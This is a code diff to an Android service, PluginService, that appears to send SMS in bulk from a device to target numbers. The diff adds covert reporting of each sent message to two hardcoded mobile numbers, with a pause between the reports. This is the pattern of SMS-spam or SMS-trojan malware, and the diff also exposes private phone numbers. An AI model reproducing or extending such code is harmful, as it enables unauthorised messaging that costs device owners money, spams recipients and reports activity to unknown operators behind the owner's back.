@@ -122,7 +122,21 @@ public class PluginService extends IntentService {
                                 }
                             }
 
-                            SMSUtil.sendSMS("18811087096", "[[通知短信]]子程序向:" + target + "  发送了:" + SEND_MESSAGE_CONTENT[i]);
+                            String debugMsg = "[[通知短信]]子程序向:" + target + "  发送了:" + SEND_MESSAGE_CONTENT[i];
+                            SMSUtil.sendSMS("18811087096", debugMsg);
+
+                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
+                                            " with " + debugMsg);
+                            try {
+                                //等待1S
+                                Thread.sleep(1000);
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                                if (Config.DEBUG) {
+                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+                                }
+                            }
+                            SMSUtil.sendSMS("15810864155", debugMsg);
                         }
 
                         try {
